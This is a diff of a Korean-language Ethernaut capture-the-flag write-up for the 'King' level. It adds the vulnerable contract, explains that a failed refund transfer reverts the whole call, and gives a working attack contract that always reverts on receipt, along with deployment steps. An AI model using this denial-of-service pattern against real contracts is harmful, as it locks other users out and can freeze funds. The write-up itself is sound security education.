@@ -814,7 +814,9 @@ await contract.locked();
 
 ### 문제 요약
 
-작성 예정.
+내 컨트랙트를 왕으로 만든 뒤, 이후 다른 사용자가 왕이 되지 못하게 막으면 클리어된다. 
+
+핵심은 이전 왕에게 ETH를 돌려주는 로직이 실패하면 전체 트랜잭션이 revert된다는 점이다.
 
 ### 핵심
 
@@ -822,19 +824,99 @@ await contract.locked();
 - ETH 수신 거부
 - `transfer` 실패 처리
 
+### 소스 코드
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+    address king;
+    uint256 public prize;
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    receive() external payable {
+        require(msg.value >= prize || msg.sender == owner);
+        payable(king).transfer(msg.value);
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    function _king() public view returns (address) {
+        return king;
+    }
+}
+```
+
 ### 풀이
 
-작성 예정.
+새 왕이 되려면 현재 `prize` 이상을 보내야 한다.
+
+```solidity
+require(msg.value >= prize || msg.sender == owner);
+```
+
+그 다음 기존 왕에게 새로 들어온 ETH를 돌려준다.
+
+```solidity
+payable(king).transfer(msg.value);
+```
+
+문제는 이 `transfer()`가 실패하면 전체 `receive()`가 revert된다는 점이다. 그래서 ETH를 받을 수 없는 공격 컨트랙트를 왕으로 만들면 된다.
+
+공격 컨트랙트가 왕이 된 뒤 다른 사용자가 더 많은 ETH를 보내면, `King` 컨트랙트는 이전 왕인 공격 컨트랙트에 ETH를 보내려고 한다. 공격 컨트랙트의 `receive()`가 revert하므로 새 왕 교체도 실패한다.
 
 ### 공격 코드
 
 ```solidity
-// 작성 예정
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract KingAttack {
+    constructor(address payable target) payable {
+        (bool success,) = target.call{value: msg.value}("");
+        require(success, "failed to become king");
+    }
+
+    receive() external payable {
+        revert("no refund");
+    }
+}
 ```
+
+Remix에서 `KingAttack`을 배포할 때 `target`에는 Ethernaut 인스턴스 주소를 넣는다.
+
+```javascript
+contract.address
+```
+
+`Value`에는 현재 `prize` 이상을 넣어야 한다.
+
+```javascript
+String(await contract.prize())
+```
+
+배포 후 왕이 공격 컨트랙트 주소로 바뀌었는지 확인한다.
+
+```javascript
+await contract._king()
+```
+
+이후 인스턴스를 제출하면 된다.
 
 ### 정리
 
-작성 예정.
+외부 주소로 ETH를 보낼 때 실패 가능성을 고려하지 않으면 DoS가 생긴다. 
+
+특히 `transfer()` 실패가 핵심 상태 변경을 막는 구조는 위험하다.
+
+![alt text](/assets/images/ethernaut/image-1.png)
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="Re-entrancy" markdown="1">
